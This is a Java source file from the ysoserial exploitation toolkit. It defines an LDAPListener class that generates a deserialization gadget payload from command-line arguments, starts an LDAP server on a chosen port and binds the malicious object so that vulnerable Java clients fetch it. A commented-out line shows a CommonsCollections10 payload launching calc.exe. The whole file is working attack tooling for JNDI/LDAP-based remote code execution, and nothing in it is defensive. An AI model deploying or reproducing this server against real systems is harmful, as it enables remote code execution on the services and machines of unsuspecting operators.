package ysoserial.exploit;


import ysoserial.exploit.LDAPServer.runnable.BindEXP;
import ysoserial.exploit.LDAPServer.runnable.RunLDAPServer;
//import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.ObjectPayload;

// https://github.com/1nhann/LDAPServer
public class LDAPListener {
    public static void main(String[] args) throws Exception {
        if ( args.length < 3 ) {
            System.err.println(LDAPListener.class.getName() + " <port> <payload_type> <payload_arg>");
            System.exit(-1);
            return;
        }
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(args[ 1 ], args[ 2 ]);
        int port = Integer.parseInt(args[ 0 ]);
//        Object o = new CommonsCollections10().getObject("calc.exe");
        new LDAPListener().run(port,payloadObject);
    }
    public void run(int port , Object evil){
        RunLDAPServer.runLDAPServer(port);
        BindEXP.bindEXP(evil);
    }
    public void run(int port){
        RunLDAPServer.runLDAPServer(port);
    }
}
